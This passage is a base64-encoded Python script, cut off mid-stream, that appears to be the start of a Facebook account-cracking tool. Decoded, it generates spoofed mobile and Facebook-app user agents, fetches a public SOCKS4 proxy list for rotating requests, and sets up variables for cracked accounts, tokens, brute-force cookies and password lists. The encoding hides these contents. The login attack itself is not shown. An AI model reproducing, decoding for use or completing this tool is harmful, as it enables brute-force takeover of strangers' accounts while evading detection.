kbzsgcWNvbTsgcnVfUlU7IDk5NjQwOTExKSIKdWFzX3JhbmRvbSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IHpoLUNOOyBIVUFXRUkgTVQ3LVRMMDAgQnVpbGQvSHVhd2VpTVQ3LVRMMDApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS80MC4wLjIyMTQuODkgVUNCcm93c2VyLzExLjMuOC45MDkgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJOb2tpYUMzLTAwLzUuMCAoMDguNjMpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE5va2lhIDUuMSBQbHVzIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIHNlcGVydGkgR2Vja28pIFZlcnNpLzQuMCBDaHJvbWUvODMuMC40MTAzLjEwNiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgU0FNU1VORyBTTS1HNzgwRykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMTYuMCBDaHJvbWUvOTIuMC40NTE1LjE2NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdKQp1YXNfbm9raWFjMyA9ICJOb2tpYUMzLTAwLzUuMCAoMDguNjMpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsiCnVhc19ub2tpYTVwbHVzID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTm9raWEgNS4xIFBsdXMgQnVpbGQvUVAxQS4xOTA3MTEuMDIwOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgc2VwZXJ0aSBHZWNrbykgVmVyc2kvNC4wIENocm9tZS84My4wLjQxMDMuMTA2IE1vYmlsZSBTYWZhcmkvNTM3LjM2Igp1YXNfcmFuZG9tMiA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjQuNDsgZW4tYXU7IFNBTVNVTkcgU00tTjkxNUcgQnVpbGQvS1RVODRQKSBBcHBsZVdlYktpdC81MzcuMzYgKEtUSE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzIuMCBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzI3LjAuODcuOTAgTW9iaWxlIFNhZmFyaS81MzcuMzYgTm9raWFCcm93c2VyLzEuMCxnemlwKGdmZSkiLCJNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IHpoLUNOOyBIVUFXRUkgTVQ3LVRMMDAgQnVpbGQvSHVhd2VpTVQ3LVRMMDApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS80MC4wLjIyMTQuODkgVUNCcm93c2VyLzExLjMuOC45MDkgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE0yMDA2QzNNRykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgxLjAuNDA0NC4xMzggTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4wOyBTTS1HOTMwVkMgQnVpbGQvTlJEOTBNOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU4LjAuMzAyOS44MyBNb2JpbGUgU2FmYXJpLzUzNy4zNiJdKQp1Z2VuMj1bJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgdml2byAxOTA0IEJ1aWxkL1JQMUEuMjAwNzIwLjAxMjspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDQuMC41MTEyLjk3IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDk7IFNILTAzSikgQXBwbGVXZWJLaXQvNTI4LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiddCnVnZW49WydNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IHZpdm8gMTkwNCBCdWlsZC9SUDFBLjIwMDcyMC4wMTI7KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTA0LjAuNTExMi45NyBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBTSC0wM0opIEFwcGxlV2ViS2l0LzUyOC4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzIuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnXQp1Z2VuMj1bXQp1Z2VuPVtdCmNva2JydXQ9W10Kc2VzPXJlcXVlc3RzLlNlc3Npb24oKQpwcmluY3A9W10KdHJ5OgoJcHJveCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RoZVNwZWVkWC9QUk9YWS1MaXN0L21hc3Rlci9zb2NrczQudHh0JykudGV4dAoJb3BlbignLnByb3gudHh0JywndycpLndyaXRlKHByb3gpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCXByaW50KCcgJykKcHJveD1vcGVuKCcucHJveC50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQpmb3IgeGQgaW4gcmFuZ2UoMTAwMDApOgoJYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJwoJYj1yYW5kb20ucmFuZHJhbmdlKDEsIDkpCgljPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkKCWQ9JzExOyBSZWRtaSBOb3RlIDVBIExpdGUpJwoJZT1yYW5kb20ucmFuZHJhbmdlKDEwMCwgOTk5OSkKCWY9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pJwoJZz1yYW5kb20ucmFuZHJhbmdlKDEsIDkpCgloPXJhbmRvbS5yYW5kcmFuZ2UoMSwgNCkKCWk9cmFuZG9tLnJhbmRyYW5nZSgxLCA0KQoJaj1yYW5kb20ucmFuZHJhbmdlKDEsIDQpCglrPSdDaHJvbWUvOTYuMC40NjY0LjQ1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwoJdWFrdT0oZid7YX17Yn0ue2N9IHtkfXtlfXtmfXtnfS57aH0ue2l9LntqfSB7a30nKQoJdWdlbjIuYXBwZW5kKHVha3UpCgkKCWFhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7JwoJYj1yYW5kb20uY2hvaWNlKFsnNy4wJywnOC4xLjAnLCc5JywnMTAnLCcxMScsJzEyJ10pCgljPXJhbmRvbS5jaG9pY2UoWydNMjEwMUs2RyddKQoJZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKCWU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCglmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZz0nQnVpbGQvU0tRMS4yMTA5MDguMDAxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbyknCgloPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQoJaT0nMCcKCWo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCglrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQoJbD0nVmVyc2lvbi80LjAgQ2hyb21lLzExMC4wLjU0ODEuNjUgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvNDAzLjAuMC4yNy44MTtdJwoJdWFrdTI9Zid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JwoJdWdlbi5hcHBlbmQodWFrdTIpCgkKCWFhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7JwoJYj1yYW5kb20uY2hvaWNlKFsnNS4wJywnNi4wJywnNy4wJywnOC4xLjAnLCc5JywnMTAnLCcxMScsJzEyJ10pCgljPXJhbmRvbS5jaG9pY2UoWydSTVgzMzk2J10pCglkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKCWY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCglnPSdCdWlsZC9TUDFBLjIxMDgxMi4wMTY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKScKCWg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCglpPScwJwoJaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKCWs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCglsPSdWZXJzaW9uLzQuMCBDaHJvbWUvMTEwLjAuNTQ4MS42NSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi80MDMuMC4wLjI3LjgxO10nCgl1YWt1Mj1mJ3thYX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nCgl1Z2VuLmFwcGVuZCh1YWt1MikKCQoJYWE9J01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsnCgliPXJhbmRvbS5jaG9pY2UoWyc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInLCcxMyddKQoJYz1yYW5kb20uY2hvaWNlKFsnUk1YMzM5NiddKQoJZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKCWU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCglmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZz0nQnVpbGQvVFAxQS4yMjA5MDUuMDAxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbyknCgloPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQoJaT0nMCcKCWo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCglrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQoJbD0nVmVyc2lvbi80LjAgQ2hyb21lLzEwOS4wLjU0MTQuMTE3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzQwMi4xLjAuMjQuODQ7XScKCXVha3UyPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKCXVnZW4uYXBwZW5kKHVha3UyKQoJCglhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7JwoJYj1yYW5kb20uY2hvaWNlKFsnOScsJzEwJywnMTEnLCcxMiddKQoJYz1yYW5kb20uY2hvaWNlKFsnVjIxNDcnXSkKCWQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCgllPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQoJZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKCWc9J0J1aWxkL1NQMUEuMjEwODEyLjAwMzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pJwoJaD1yYW5kb20ucmFuZHJhbmdlKDgwLDEwMykKCWk9JzAnCglqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQoJaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkKCWw9J1ZlcnNpb24vNC4wIENocm9tZS8xMTAuMC41NDgxLjY1IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzQwMy4wLjAuMjcuODE7XScKCXVha3UyPWYne2F9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JwoJCgl1Z2VuLmFwcGVuZCh1YWt1MikKCQkKCQoJYWE9J01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsnCgliPXJhbmRvbS5jaG9pY2UoWyc3LjAnLCc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInXSkKCWM9cmFuZG9tLmNob2ljZShbJzIyMDExMTZQRyddKQoJZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKCWU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCglmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbyknCgloPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQoJaT0nMCcKCWo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCglrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQoJbD0nQ2hyb21lLzEwNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicKCXVha3UyPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKCXVnZW4uYXBwZW5kKHVha3UyKQoJCglhYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOycKCWI9cmFuZG9tLmNob2ljZShbJzcuMCcsJzguMS4wJywnOScsJzEwJywnMTEnLCcxMiddKQoJYz1yYW5kb20uY2hvaWNlKFsnUk1YMzExNSBCdWlsZC9TUDFBLjIxMDgxMi4wMTY7IHd2J10pCglkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKCWY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCglnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKScKCWg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCglpPScwJwoJaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKCWs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCglsPSdWZXJzaW9uLzQuMCBDaHJvbWUvMTA3LjAuNTMwNC45MSBNb2JpbGUgU2FmYXJpLzUzNy4zNicKCXVha3UyPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKCXVnZW4uYXBwZW5kKHVha3UyKQoJCglhYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOycKCWI9cmFuZG9tLmNob2ljZShbJzcuMCcsJzguMS4wJywnOScsJzEwJywnMTEnLCcxMiddKQoJYz1yYW5kb20uY2hvaWNlKFsnU0hBUksgS1RVUy1IMCddKQoJZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKCWU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCglmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbyknCgloPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQoJaT0nMCcKCWo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCglrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQoJbD0nQ2hyb21lLzEwNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicKCXVha3UyPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKCXVnZW4uYXBwZW5kKHVha3UyKQoJCQoJYWE9J01vemlsbGEvNS4wIChpUGhvbmU7JwoJYj1yYW5kb20uY2hvaWNlKFsnNy4wJywnOC4xLjAnLCc5JywnMTAnLCcxMScsJzEyJ10pCgljPXJhbmRvbS5jaG9pY2UoWydDUFUgaVBob25lIE9TIDE2XzAgbGlrZSBNYWMgT1MgWCknXSkKCWQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCgllPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQoJZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKCWc9J0FwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbyknCgloPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQoJaT0nMCcKCWo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCglrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQoJbD0nTW9iaWxlLzIwQTM1NyBbRkJBTi9GQklPUztGQkRWL2lQaG9uZTE1LDM7RkJNRC9pUGhvbmU7RkJTTi9pT1M7RkJTVi8xNi4wO0ZCU1MvMztGQklEL3Bob25lO0ZCTEMvZW5fUWFhdV9HQjtGQk9QLzVdJwoJdWFrdTI9Zid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JwoJdWdlbi5hcHBlbmQodWFrdTIpCgkKCWFhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7JwoJYj1yYW5kb20uY2hvaWNlKFsnNy4wJywnOC4xLjAnLCc5JywnMTAnLCcxMScsJzEyJ10pCgljPXJhbmRvbS5jaG9pY2UoWydJbmZpbml4IFg2ODhCJ10pCglkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKCWY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCglnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKScKCWg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCglpPScwJwoJaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKCWs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCglsPSdDaHJvbWUvMTA3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JwoJdWFrdTI9Zid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JwoJdWdlbi5hcHBlbmQodWFrdTIpCgkJCgkJCQkJCglhYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOycKCWI9cmFuZG9tLmNob2ljZShbJzcuMCcsJzguMS4wJywnOScsJzEwJywnMTEnLCcxMiddKQoJYz1yYW5kb20uY2hvaWNlKFsnTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpJ10pCglkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQoJZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKCWY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCglnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKScKCWg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCglpPScwJwoJaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKCWs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCglsPSdWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScKCXVha3UyPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKCQppZCxpZDIsbG9vcCxvayxjcCxha3VuLG9wcmVrLG1ldGhvZCxsaXNlbnNpa3UsdGFwbGlrYXNpLHRva2Vua3UsdWlkLGxpc2Vuc2lrdW5pPSBbXSxbXSwwLDAsMCxbXSxbXSxbXSxbXSxbXSxbXSxbXSxbXQpjb2ticnV0PVtdCnB3cGx1c3MscHdueWE9W10sW10KIy0tLS0tLS0tLS0tLVsg8J2QmPCdkIDwnZCS8J2QiPCdkJEgXS0tLS0tLS0tLS0tLS0tIwpQID0gJ1x4MWJbMTs5N20nCk0gPSAnXHgxYlsxOzkxbScKSCA9ICdceDFiWzE7OTJtJwpLID0gJ1x4MWJbMTs5M20nCkIgPSAnXHgxYlsxOzk0bScKVSA9ICdceDFiWzE7OTVtJyAKTyA9ICdceDFiWzE7OTZtJwpOID0gJ1x4MWJbMG0nICAgIApaID0gIlwwMzNbMTszMG0iCnNpciA9ICdcMDMzWzQxbVx4MWJbMTs5N20nCnggPSAnXDMzW20nICMgREVGQVVMVAptID0gJ1x4MWJbMTs5MW0nICNSRUQgKwprID0gJ1wwMzNbOTNtJyAjIEtVTklORyArCmggPSAnXHgxYlsxOzkybScgIyBISUpBVSArCmhoID0gJ1wwMzNbMzJtJyAjIEhJSkFVIC0KdSA9ICdcMDMzWzk1bScgIyBVTkdVCmtrID0gJ1wwMzNbMzNtJyAjIEtVTklORyAtCmIgPSAnXDMzWzE7OTZtJyAjIEJJUlUgLQpwID0gJ1x4MWJbMDszNG0nICMgQklSVSArCmFzdSA9IHJhbmRvbS5jaG9pY2UoW20sayxoLHUsYl0pCiMtLS0tLS0tLS0tLS0tLS0tLS0tLVsg8J2QmPCdkIDwnZCS8J2QiPCdkJFdLS0tLS0tLS0tLS0tLS0jCmRpYyA9IHsnMSc6J0phbnVhcnknLCcyJzonRmVicnVhcnknLCczJzonTWFyY2gnLCc0JzonQXByaWwnLCc1JzonTWF5JywnNic6J0p1bmUnLCc3JzonSnVseScsJzgnOidBdWd1c3QnLCc5JzonU2VwdGVtYmVyJywnMTAnOidPY3RvYmVyJywnMTEnOidOb3ZlbWJlcicsJzEyJzonRGVjZW1iZXInfQpkaWMyID0geycwMSc6J0phbnVhcnknLCcwMic6J0ZlYnJ1YXJ5JywnMDMnOidNYXJjaCcsJzA0JzonQXByaWwnLCcwNSc6J01heScsJzA2JzonSnVuZScsJzA3JzonSnVseScsJzA4JzonQXVndXN0JywnMDk